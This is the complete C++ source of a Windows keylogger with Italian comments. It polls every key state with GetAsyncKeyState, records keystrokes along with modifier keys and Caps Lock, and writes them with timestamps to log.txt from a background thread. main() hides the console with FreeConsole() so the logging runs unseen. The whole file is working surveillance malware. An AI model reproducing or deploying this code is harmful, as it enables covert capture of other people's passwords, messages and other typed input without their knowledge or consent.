#include <iostream>
#include <fstream>
#include <windows.h>
#include <mutex>
#include <thread>
#include <queue>
#include <condition_variable>
#include <unordered_set>
#include <ctime>

#define DELAY 50  // Millisecondi tra i controlli per ridurre il carico sulla CPU

std::mutex mtx;
std::queue<std::string> keyQueue;
std::condition_variable cv;
bool running = true;
std::unordered_set<int> activeKeys;  // Per evitare doppie registrazioni nello stesso ciclo
std::unordered_set<int> modifiers;  // Per tenere traccia dei tasti modificatori attivi

// Ottiene la data e l'ora corrente come stringa
std::string getCurrentDateTime() {
    time_t now = time(0);
    struct tm tstruct;
    char buf[80];
    tstruct = *localtime(&now);
    // Modifica per il formato desiderato "gg mm yyyy HH:MM:SS"
    strftime(buf, sizeof(buf), "[%d/%m/%Y %H:%M:%S]", &tstruct);
    return std::string(buf);
}


// Scrive i tasti nel file in modo asincrono
void logToFile() {
    std::ofstream out("log.txt", std::ios::app);

    // Aggiungi la data e un accapo all'inizio del file
    out << "\n" << getCurrentDateTime() << "\n";  // Data e ora all'inizio del file

    while (running) {
        std::unique_lock<std::mutex> lock(mtx);
        cv.wait(lock, [] { return !keyQueue.empty() || !running; });

        while (!keyQueue.empty()) {
            out << keyQueue.front();
            keyQueue.pop();
        }
        out.flush();  // Evita scritture troppo frequenti su disco
    }
}

// Converte una stringa wide (UTF-16) in UTF-8
std::string WideToUTF8(const std::wstring& wstr) {
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string str(size_needed - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], size_needed, nullptr, nullptr);
    return str;
}

// Converte il codice del tasto in carattere Unicode
std::string getKeyCharacter(int keyCode) {
    BYTE keyboardState[256];
    if (!GetKeyboardState(keyboardState)) return "";

    WCHAR unicodeChar[2] = {0};
    HKL layout = GetKeyboardLayout(0);
    if (ToUnicodeEx(keyCode, MapVirtualKeyEx(keyCode, 0, layout), keyboardState, unicodeChar, 2, 0, layout) == 1) {
        return WideToUTF8(std::wstring(1, unicodeChar[0]));
    }

    return "";
}

// Controlla e registra i tasti speciali se ancora premuti
std::string getActiveModifiers() {
    std::string result;
    
    if (modifiers.count(VK_CONTROL)) result += "[CTRL+]";
    if (modifiers.count(VK_MENU)) result += "[ALT+]";
    if (modifiers.count(VK_SHIFT)) result += "[SHIFT+]";
    if (modifiers.count(VK_LWIN) || modifiers.count(VK_RWIN)) result += "[WIN+]";
    if (GetAsyncKeyState(VK_CAPITAL) & 0x1) result += "[CAPS_LOCK]";  // Rileva CAPS LOCK

    return result;
}

// Registra i tasti premuti, inclusi i modificatori attivi al momento
void detectKeys() {
    while (running) {
        for (int i = 8; i < 256; ++i) {
            SHORT keyState = GetAsyncKeyState(i);
            if (keyState & 0x8000) {  // Tasto premuto
                if (activeKeys.find(i) == activeKeys.end()) {  // Se non è già registrato nel ciclo attuale
                    std::string keyOutput;

                    if (i == VK_CONTROL || i == VK_SHIFT || i == VK_MENU || i == VK_LWIN || i == VK_RWIN) {
                        modifiers.insert(i);  // Se è un modificatore, lo aggiungiamo alla lista
                    }

                    if (i == VK_CAPITAL || (i >= VK_UP && i <= VK_DOWN)) {  // Rileva CAPS LOCK e le freccette
                        keyOutput += getKeyCharacter(i);  // I tasti speciali sono registrati da soli
                    } else {
                        std::string key = getKeyCharacter(i);
                        if (!key.empty()) {
                            keyOutput += getActiveModifiers() + key;  // Aggiunge modificatori solo se un altro tasto è premuto
                        }
                    }

                    if (!keyOutput.empty()) {
                        std::lock_guard<std::mutex> lock(mtx);
                        keyQueue.push(keyOutput);
                        cv.notify_one();
                    }

                    activeKeys.insert(i);  // Segna il tasto come registrato in questo ciclo
                }
            } else {
                activeKeys.erase(i);  // Rimuove il tasto quando viene rilasciato
                modifiers.erase(i);   // Rimuove il modificatore quando non più premuto
            }
        }
        Sleep(DELAY);
    }
}

int main() {
    FreeConsole();  // Nasconde la console
    std::thread logThread(logToFile);
    detectKeys();
    
    running = false;
    cv.notify_one();
    logThread.join();

    return 0;
}

